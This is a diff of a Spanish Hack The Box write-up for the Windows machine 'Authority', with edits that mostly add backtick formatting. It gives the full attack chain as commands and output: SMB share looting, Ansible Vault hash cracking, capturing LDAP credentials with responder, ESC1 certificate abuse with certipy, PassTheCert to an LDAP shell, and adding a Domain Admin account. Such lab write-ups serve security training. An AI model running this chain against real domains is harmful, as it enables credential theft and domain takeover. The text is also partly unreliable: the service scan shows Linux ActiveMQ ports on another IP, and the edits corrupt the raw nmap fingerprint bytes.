@@ -45,13 +45,13 @@ image:
   
 ## Descripción
 
-authority es una máquina medium windows, destaca los peligros de las malas configuraciones, la reutilización de contraseñas, el almacenamiento de credenciales en recursos compartidos, y cómo las configuraciones predeterminadas en Active Directory (como la capacidad de que todos los usuarios del dominio puedan agregar hasta 10 computadoras al dominio) pueden combinarse con otros fallos de seguridad (como las plantillas de certificados vulnerables de AD CS) para tomar el control de un dominio
+`authority` es una máquina `medium windows`, destaca los peligros de las `malas configuraciones`, la `reutilización de contraseñas`, el `almacenamiento de credenciales en recursos compartidos`, y cómo las `configuraciones predeterminadas en Active Directory` (como la capacidad de que todos los usuarios del dominio puedan agregar hasta 10 computadoras al dominio) pueden combinarse con otros fallos de seguridad (como las `plantillas de certificados vulnerables de AD CS`) para tomar el control de un dominio
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la máquina está activa y se determina su sistema operativo, el ttl de las máquinas windows suele ser 128, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping -c 3 10.129.229.56
@@ -67,7 +67,7 @@ rtt min/avg/max/mdev = 36.046/36.167/36.402/0.165 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
+Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.229.56 -oG openPorts 
@@ -142,7 +142,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
            Raw packets sent: 77634 (3.416MB) | Rcvd: 63643 (2.546MB)
 ```
 
-Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p 22,80,1883,5672,8161,46821,61613,61614,61616 10.129.137.211 -oN services
@@ -222,34 +222,34 @@ PORT      STATE SERVICE    VERSION
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
 SF-Port5672-TCP:V=7.94SVN%I=7%D=10/7%Time=670415B7%P=x86_64-pc-linux-gnu%r
 SF:(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x
-SF:10\xc0\x0c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0\0\0\0S\x18\xc0S\
+SF:10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\
 SF:x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20
 SF:client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,
 SF:"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\
-SF:xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M
+SF:xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M
 SF:\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using
 SF:\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0
 SF:\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0
-SF:\0\x7f\xff\0\0\0\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amq
+SF:\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amq
 SF:p:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported
 SF:\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0
-SF:\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0
+SF:\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`
 SF:\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa1
 SF:7Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attemp
 SF:ted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x
-SF:19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0
+SF:19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0
 SF:\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conne
 SF:ction\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%
 SF:r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\
-SF:0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0\0\0\0S
+SF:0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S
 SF:\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x
 SF:20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSe
 SF:ssionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
-SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0\0\0\0S\x18\xc0S\x01
+SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
 SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
 SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCook
 SF:ie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0
-SF:c\x04\xa1\0@p\0\x02\0\0\x7f\xff\0\0\0\x02\0\0\0\0S\x18\xc0S\x01\0S\x1
+SF:c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1
 SF:d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x2
 SF:0using\x20unsupported\x20AMQP\x20attempted");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
@@ -282,7 +282,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.90 seconds
 
 ### Smb Enumeration
 
-Obtenemos el nombre de la máquina y el dominio
+`Obtenemos` el `nombre` de la `máquina` y el `dominio`
 
 ```
 # netexec smb 10.129.229.56 -u 'guest' -p ''           
@@ -290,7 +290,7 @@ SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019
 SMB         10.129.229.56   445    authority        [+] authority.htb\guest: 
 ```
 
-Agregamos el dominio y el nombre de la máquina al /etc/hosts
+`Agregamos` el `dominio` y el `nombre` de la `máquina` al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -303,7 +303,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Listamos recursos compartidos por smb
+`Listamos` recursos compartidos por `smb`
 
 ```
 # netexec smb 10.129.229.56 -u 'guest' -p '' --shares  
@@ -321,7 +321,7 @@ SMB         10.129.229.56   445    authority        NETLOGON                    
 SMB         10.129.229.56   445    authority        SYSVOL                          Logon server share 
 ```
 
-Nos conectamos con smbclient y nos descargamos en nuestro equipo todos los recursos compartidos por smb
+Nos conectamos con `smbclient` y nos `descargamos` en nuestro equipo todos los `recursos` `compartidos` por `smb`
 
 ```
 # smbclient -N //10.129.229.56/Development
@@ -338,7 +338,7 @@ smb: \> mget *
 smb: \> exit
 ```
 
-Estos tres hashes nos los vamos a guardar cada uno en un archivo distinto, el archivo se encuentra en la carpeta Defaults
+Estos tres `hashes` nos los vamos a `guardar` cada uno en un `archivo distinto`, el archivo se encuentra en la carpeta `Defaults`
 
 {% raw %}
 ```
@@ -409,7 +409,7 @@ $ANSIBLE_VAULT;1.1;AES256
 3764
 ```
 
-Usamos john para romper el hash, el hash es el mismo en los tres archivos
+Usamos `john` para romper el `hash`, el `hash` es el `mismo` en los `tres archivos`
 
 ```
 # john -w:/usr/share/wordlists/rockyou.txt hash_1.txt   
@@ -424,7 +424,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-Desencriptamos el mensaje de cada texto hasheado
+`Desencriptamos` el `mensaje` de cada texto hasheado
 
 ```
 # ansible-vault decrypt hash_1.yml --output hash_1_decrypted.txt
@@ -440,7 +440,7 @@ Vault password:
 Decryption successful
 ```
 
-Obtenemos lo que parece ser un usuario y dos contraseñas
+`Obtenemos` lo que parece ser un `usuario` y dos `contraseñas`
 
 ```
 # cat hash_1_decrypted.txt 
@@ -453,37 +453,37 @@ DevT3st@123
 
 ### Web Enumeration
 
-Si accedemos a https://10.129.144.88:8443/ vemos esto
+Si accedemos a `https://10.129.144.88:8443/` vemos esto
 
 ![](/assets/img/Authority/image_1.png)
 
 ![](/assets/img/Authority/image_2.png)
 
-Pinchamos en Configuration Editor y nos logueamos
+Pinchamos en `Configuration Editor` y nos logueamos
 
 ![](/assets/img/Authority/image_3.png)
 
 ## Web Exploitation
 
-Una vez dentro pulsamos en LDAP y en Connection 
+Una vez dentro pulsamos en `LDAP` y en `Connection` 
 
 ![](/assets/img/Authority/image_4.png)
 
-Pinchamos en Add Value
+Pinchamos en `Add Value`
 
 ![](/assets/img/Authority/image_5.png)
 
-Modificamos el valor, ponemos nuestra ip, el puerto por defecto de ldap y usamos ldap en vez de ldaps para que el tràfico no esté cifrado
+`Modificamos` el `valor`, ponemos nuestra `ip`, el `puerto` por `defecto` de `ldap` y usamos `ldap` en vez de `ldaps` para que el `tràfico` no esté `cifrado`
 
 ![](/assets/img/Authority/image_6.png)
 
-Pulsamos en Save y nos ponemos en escucha con el responder
+Pulsamos en `Save` y nos ponemos en `escucha` con el `responder`
 
 ```
 # responder -I tun0
 ```
 
-Pulsamos en Test LDAP Profile y capturamos una autenticación
+Pulsamos en `Test LDAP Profile` y `capturamos` una `autenticación`
 
 ```
 # responder -I tun0
@@ -567,7 +567,7 @@ Pulsamos en Test LDAP Profile y capturamos una autenticación
 
 ## Intrusión
 
-Validamos las credenciales
+`Validamos` las `credenciales`
 
 ```
 # netexec winrm 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'               
@@ -575,7 +575,7 @@ WINRM       10.129.229.56   5985   authority        [*] Windows 10 / Server 2019
 WINRM       10.129.229.56   5985   authority        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
 ```
 
-Nos conectamos a la máquina víctima
+Nos `conectamos` a la `máquina víctima`
 
 ```
 # evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
@@ -593,7 +593,7 @@ htb\svc_ldap
 
 ## Privilege Escalation
 
-Enumeramos los grupos y privilegios de nuestro usuario, el grupo Certificate Service DCOM Access me llama la atención
+`Enumeramos` los `grupos` y `privilegios` de nuestro usuario, el grupo `Certificate Service DCOM Access` me llama la atención
 
 ```
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all
@@ -641,7 +641,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-Nos descargamos [https://github.com/61106960/adPEAS.git](https://github.com/61106960/adPEAS.git), nos conectamos a través de winrm a la máquina víctima desde el mismo directorio donde se encuentran los binarios .ps1 y subimos adPEAS.ps1 a la máquina víctima
+Nos `descargamos` [https://github.com/61106960/adPEAS.git](https://github.com/61106960/adPEAS.git), nos conectamos a través de `winrm` a la máquina víctima desde el `mismo directorio` donde se encuentran los binarios `.ps1` y subimos `adPEAS.ps1` a la máquina víctima
 
 ```
 # evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
@@ -662,13 +662,13 @@ Data: 4655524 bytes of 4655524 bytes copied
 Info: Upload successful!
 ```
 
-Importamos el módulo
+`Importamos` el `módulo`
 
 ```
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Import-Module .\adPEAS.ps1
 ```
 
-Ejecutamos el script
+`Ejecutamos` el `script`
 
 ```
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS
@@ -1016,13 +1016,13 @@ lastLogonTimestamp:			10/09/2024 08:08:30
 [?] +++++ Searching for Detailed Active Directory Information with BloodHound +++++
 ```
 
-Nos detecta varias templates y nos recomienda usar Certipy [https://github.com/ly4k/Certipy.git](https://github.com/ly4k/Certipy.git) o Certify [https://github.com/GhostPack/Certify.git](https://github.com/GhostPack/Certify.git), en este caso voy a usar Certipy porque me parece más cómodo
+Nos detecta varias `templates` y nos recomienda usar `Certipy` [https://github.com/ly4k/Certipy.git](https://github.com/ly4k/Certipy.git) o `Certify` [https://github.com/GhostPack/Certify.git](https://github.com/GhostPack/Certify.git), en este caso voy a usar `Certipy` porque me parece más cómodo
 
 ```
 # pip3 install certipy-ad
 ```
 
-Ejecutamos certipy y nos encuentra la vulnerabiliad ESC1
+Ejecutamos `certipy` y nos encuentra la vulnerabiliad `ESC1`
 
 ```
 # certipy-ad find -u svc_ldap@authority.htb -p ''lDaP_1n_th3_cle4r!'' -dc-ip 10.129.229.56 -vulnerable -stdout
@@ -1109,7 +1109,7 @@ Certificate Templates
       ESC1                              : 'authority.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
 ```
 
-Vemos que el dns es authority.authority.htb por lo tanto debemos añadirlo al /etc/hosts
+Vemos que el dns es `authority.authority.htb` por lo tanto debemos añadirlo al `/etc/hosts`
 
 ```
 127.0.0.1       localhost
@@ -1122,7 +1122,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Observamos que como usuario no podemos explotar esta vulnerabilidad, debemos crear una máquina en el dominio, lo primero es comprobar si nuestro usuario puede crearlas, para ello usaremos un módulo de netexec. A esto se le llama Machine Account Quota, que es una configuración en Active Directory que determina cuántas cuentas de máquina (como las que se utilizan para unir computadoras a un dominio) puede crear un usuario específico. Por defecto, esta cuota es 10, lo que significa que un usuario puede crear hasta 10 cuentas de máquina en el dominio
+Observamos que como `usuario` no podemos `explotar` esta `vulnerabilidad`, debemos `crear` una `máquina` en el `dominio`, lo primero es `comprobar` si nuestro `usuario` puede `crearlas`, para ello usaremos un `módulo` de `netexec`. A esto se le llama `Machine Account Quota`, que es una configuración en `Active Directory` que determina cuántas `cuentas de máquina` (como las que se utilizan para unir computadoras a un `dominio`) puede crear un `usuario` específico. Por defecto, esta cuota es `10`, lo que significa que un usuario puede crear hasta `10 cuentas de máquina` en el dominio
 
 ```
 # netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
@@ -1135,7 +1135,7 @@ MAQ         10.129.229.56   389    authority        [*] Getting the MachineAccou
 MAQ         10.129.229.56   389    authority        MachineAccountQuota: 10
 ```
 
-Podemos crear una máquina en el equipo con este comando
+Podemos `crear` una `máquina` en el equipo con este `comando`
 
 ```
 # impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'TEST$' -computer-pass 'password'
@@ -1145,7 +1145,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account TEST$ with password password.
 ```
 
-Sincronizamos nuestra hora con la hora de la máquina víctima
+`Sincronizamos` nuestra `hora` con la hora de la máquina víctima
 
 ```
 # sudo ntpdate 10.129.229.56 
@@ -1153,8 +1153,8 @@ Sincronizamos nuestra hora con la hora de la máquina víctima
 CLOCK: time stepped by 14400.157112
 ```
 
-ESC1 ocurre cuando una plantilla de certificado permite la autenticación de cliente y permite al solicitante proporcionar un Nombre Alternativo del Sujeto (SAN) arbitrario.
-Para ESC1, podemos solicitar un certificado basado en la plantilla de certificado vulnerable y especificar un UPN o un SAN DNS arbitrario con los parámetros -upn y -dns, respectivamente
+`ESC1` ocurre cuando una `plantilla` de `certificado` permite la `autenticación` de `cliente` y permite al solicitante proporcionar un `Nombre Alternativo del Sujeto (SAN)` arbitrario.
+Para `ESC1`, podemos `solicitar` un `certificado` basado en la `plantilla` de `certificado vulnerable` y especificar un `UPN` o un `SAN DNS` arbitrario con los parámetros `-upn` y `-dns`, respectivamente
 
 ```
 # certipy-ad req -u 'TEST$' -p 'password' -ca authority-CA -target authority.authority.htb -dc-ip 10.129.229.56 -dns authority.htb -template CorpVPN -upn Administrator@authority.htb  
@@ -1172,7 +1172,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator_authority.pfx'
 ```
 
-Ahora podemos intentar usar Certipy con este archivo de certificado .pfx para solicitar un TGT (Ticket Granting Ticket) de Kerberos como el Administrador del dominio. Si todo sale bien, la herramienta realizará una autenticación Kerberos U2U (User-to-User authentication) por nosotros y descifrará el NT hash del PAC (Privilege Attribute Certificate). Entonces podremos usar el NT hash para realizar un pass-the-hash y obtener acceso de administrador. Sin embargo, obtenemos un error KDC_ERR_PADATA_TYPE_NOSUPP (el KDC no tiene soporte para el tipo de padata). Algunas búsquedas nos llevan a esta publicación del blog, que explica que esto probablemente significa que el Controlador de Dominio objetivo no soporta PKINIT [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
+Ahora podemos intentar usar `Certipy` con este archivo de certificado `.pfx` para solicitar un `TGT` (Ticket Granting Ticket) de `Kerberos` como el `Administrador` del `dominio`. Si todo sale bien, la herramienta realizará una autenticación `Kerberos U2U` (User-to-User authentication) por nosotros y descifrará el `NT hash` del `PAC` (Privilege Attribute Certificate). Entonces podremos usar el `NT hash` para realizar un `pass-the-hash` y obtener acceso de administrador. Sin embargo, obtenemos un error `KDC_ERR_PADATA_TYPE_NOSUPP` (el `KDC` no tiene soporte para el tipo de `padata`). Algunas búsquedas nos llevan a esta publicación del blog, que explica que esto probablemente significa que el `Controlador` de `Dominio` objetivo no soporta `PKINIT` [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
 
 ```
 # certipy-ad auth -pfx administrator_authority.pfx -dc-ip 10.129.229.56
@@ -1189,7 +1189,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 ```
 
-Según el artículo anterior, es posible que podamos autenticarnos a través de algunos protocolos como LDAP(S). Primero, dividamos el administrator_authority en el certificado y la clave privada utilizando los siguientes dos comandos
+Según el artículo anterior, es posible que podamos autenticarnos a través de algunos protocolos como `LDAP(S)`. Primero, dividamos el `administrator_authority` en el `certificado` y la `clave privada` utilizando los siguientes dos comandos
 
 ```
 # certipy cert -pfx administrator.pfx -nokey -out cert.crt
@@ -1197,7 +1197,7 @@ Según el artículo anterior, es posible que podamos autenticarnos a través de 
 # certipy cert -pfx administrator.pfx -nocert -out cert.key
 ```
 
-Después de eso, utilizando PassTheCert [https://github.com/AlmondOffSec/PassTheCert.git](https://github.com/AlmondOffSec/PassTheCert.git), podemos obtener una shell como Administrador a través de Schannel contra LDAP(S)
+Después de eso, utilizando `PassTheCert` [https://github.com/AlmondOffSec/PassTheCert.git](https://github.com/AlmondOffSec/PassTheCert.git), podemos obtener una `shell` como `Administrador` a través de `Schannel` contra `LDAP(S)`
 
 ```
 # python3 passthecert.py -dc-ip 10.129.229.56 -crt cert.crt -key cert.key -domain authority.htb -port 636 -action ldap-shell
@@ -1209,7 +1209,7 @@ Type help for list of commands
 u:HTB\Administrator
 ```
 
-Creamos un nuevo usuario y lo agregamos al grupo Domain Admins
+`Creamos` un nuevo `usuario` y lo `agregamos` al grupo `Domain Admins`
 
 ```
 # python3 passthecert.py -dc-ip 10.129.229.56 -crt cert.crt -key cert.key -domain authority.htb -port 636 -action ldap-shell
@@ -1252,7 +1252,7 @@ Adding new user with username: test and password: ,J94rysf}$Ud|I; result: OK
 Adding user: test to group Domain Admins result: OK
 ```
 
-Validamos las credenciales del usuario
+`Validamos` las `credenciales` del usuario
 
 ```
 # netexec smb 10.129.229.56 -u test -p ',J94rysf}$Ud|I;'                 
@@ -1260,7 +1260,7 @@ SMB         10.129.229.56   445    authority        [*] Windows 10 / Server 2019
 SMB         10.129.229.56   445    authority        [+] authority.htb\test:,J94rysf}$Ud|I; (Pwn3d!)
 ```
 
-Nos conectamos con psexec a la máquina víctima
+Nos `conectamos` con `psexec` a la máquina víctima
 
 ```
 # impacket-psexec 'authority.htb/test:,J94rysf}$Ud|I;@10.129.229.56'     
